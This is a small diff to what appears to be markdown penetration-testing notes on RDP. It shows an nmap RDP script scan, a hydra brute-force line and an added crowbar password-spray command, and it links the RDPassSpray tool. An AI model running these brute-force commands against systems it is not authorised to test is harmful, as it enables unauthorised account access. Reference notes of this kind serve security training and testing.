@@ -55,6 +55,7 @@ $ sudo nmap -sV -sC -p 3389 --script rdp* 10.129.201.248
 
 ```shell!
 $ hydra -L user.list -P password.list rdp://IP -V
+$ crowbar -b rdp -s IP/32 -u username -C password.list -v -n 64
 ```
 
 There is also [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) <small>(0.6k ⭐)</small>.
